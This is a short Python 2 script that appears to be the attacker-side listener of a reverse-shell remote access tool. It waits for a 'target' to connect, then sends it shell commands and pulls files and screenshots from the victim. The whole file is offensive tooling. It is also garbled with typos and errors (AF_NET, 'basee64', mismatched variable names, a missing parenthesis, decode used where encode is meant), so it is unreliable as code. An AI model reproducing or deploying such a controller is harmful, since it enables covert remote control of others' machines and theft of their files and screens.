import socket
import json
import base64

count=1

def reliable_send(data):
    json_data=json.dumps(data)
    target.send(json_data)

def reliable_recv():
    json_data=""
    while True:
        try:
            json_data=json_data+target.recv(1024)
            return json.loads(json_data)
        except ValueError:
            continue

def shell():
    global count
    while True:
        command = raw_input(" * shell#-%s: " %str(ip))
        reliable_send(command)
        if command == "q":
            break
        elif command[:2] == "cd" and len(command) > 1:
            continue
        elif command[:8] == "download":
            with open(command[9:],"wb") as file:
                result=reliable_recv()
                file.write(base64.b64decode(result))
        elif command[:6] == "upload":
            try:
                with open(command[7:], "rb") as fin:
                    reliable_send(base64.b64decode(fin.read()))
            except:
                failed="fialed"
                reliable_send(base64.b64decode(failed)
        elif command[:10] == "screenshot":
            with open("Screnshot%d" %count,"wb") as screen:
                image =reliable_recv()
                image_decocded=basee64.b64decode(image)
                if image_decoded[:4] == "[!!]":
                    print(image_decoded)
                else:
                    screen.write(image_decoded)
                    count +=1

        else:
            result=reliable_recv()
            print(result)

def server():
    global s
    global ip
    global target
    s= socket.socket(socket.AF_NET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    s.bind(("IP",PORT))
    s.listen(5)
    print("Listening for Incoming conn")
    target,ip = s.accept()
    print("Target Connected")

server()
shell()
s.close()
